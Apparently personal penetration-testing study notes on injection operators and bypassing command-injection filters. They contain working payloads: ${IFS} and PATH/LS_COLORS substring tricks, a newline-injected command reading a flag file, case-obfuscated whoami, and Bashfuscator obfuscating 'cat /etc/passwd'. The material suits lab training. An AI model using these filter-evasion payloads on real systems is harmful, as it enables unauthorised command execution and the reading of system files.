| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
bypass filters in command injection
space is banned - use ${IFS} (on linux)
bash brace expansion {ls,-la}
more methods:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
/ is banned - get it from PATH variable: ${PATH:0:1}
; is banned - get it from LS_COLORS: ${LS_COLORS:10:1}

example of obfuscated command
127.0.0.1%0ac$()at${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt


another example - obfuscation by changing case of whoami command (and bring back proper case)
```shell-session
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

automatic bash command obfuscation
https://github.com/Bashfuscator/Bashfuscator
```shell-session
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

how to install bashobfuscator on kali linux:
## Bashfuscator on Kali Linux (Quick Install)

Kali Linux uses Python 3.13, which is **not compatible** with Bashfuscator.  
Use `pyenv` to install an older Python **locally**.
### Install
```bash
sudo apt install -y build-essential libssl-dev zlib1g-dev \
libbz2-dev libreadline-dev libsqlite3-dev curl xz-utils \
libffi-dev liblzma-dev

curl https://pyenv.run | bash
exec $SHELL

pyenv install 3.10.14
git clone https://github.com/Bashfuscator/Bashfuscator.git
cd Bashfuscator
pyenv local 3.10.14

python -m venv venv
source venv/bin/activate
pip install -U pip setuptools wheel
pip install .

```
### Test

`bashfuscator --help`
**Done.**  
System Python remains unchanged.


windows tool: https://github.com/danielbohannon/Invoke-DOSfuscation
